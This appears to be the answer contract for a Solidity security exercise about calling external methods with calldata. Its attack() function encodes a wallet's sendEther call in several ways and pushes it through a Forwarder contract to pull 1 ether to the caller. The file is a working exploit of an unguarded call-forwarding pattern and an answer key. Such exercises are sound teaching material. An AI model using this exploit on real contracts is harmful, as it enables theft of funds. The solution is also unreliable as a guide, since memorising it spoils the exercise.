// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "../Forwarder.sol";

//Calling external methods with calldata

contract ForwarderSolution {
    Forwarder public forwarder;
    Wallet public wallet;

    constructor(Forwarder forwarder_, Wallet wallet_) {
        forwarder = forwarder_;
        wallet = wallet_;
    }

    function attack() external {
        //bytes memory calldataPayload = abi.encodePacked(bytes4(keccak256("sendEther(address,uint256)")),
        //                                                abi.encode(address(msg.sender), uint256(1 ether)));

        //bytes memory calldataPayload = abi.encodeWithSignature("sendEther(address,uint256)",
        //                                                        address(msg.sender), 1 ether);

        bytes memory calldataPayload = abi.encodeWithSelector(wallet.sendEther.selector, address(msg.sender), 1 ether);

        //function (address,uint256) external sendEther = wallet.sendEther;
        //bytes memory calldataPayload = abi.encodeCall(sendEther, (address(msg.sender), 1 ether));

        forwarder.functionCall(address(wallet), calldataPayload);
    }
}
